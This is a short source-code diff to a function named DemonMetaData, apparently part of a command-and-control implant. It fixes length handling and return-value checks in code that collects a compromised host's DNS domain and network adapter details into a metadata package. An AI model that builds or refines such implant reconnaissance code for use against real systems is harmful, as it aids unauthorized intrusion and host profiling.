@@ -188,14 +188,16 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
 
     // Get Domain
-    Length = 0;
+    dwLength = 0;
     if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &dwLength ) )
     {
         if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
         {
             MemSet( Data, 0, dwLength );
-            Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &dwLength );
-            PackageAddBytes( *MetaData, Data, dwLength );
+            if ( Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &dwLength ) )
+                PackageAddBytes( *MetaData, Data, dwLength );
+            else
+                PackageAddInt32( *MetaData, 0 );
             DATA_FREE( Data, dwLength );
         }
         else
@@ -204,6 +206,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     else
         PackageAddInt32( *MetaData, 0 );
 
+    dwLength = 0;
     Instance.Win32.GetAdaptersInfo( NULL, &dwLength );
     if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
     {
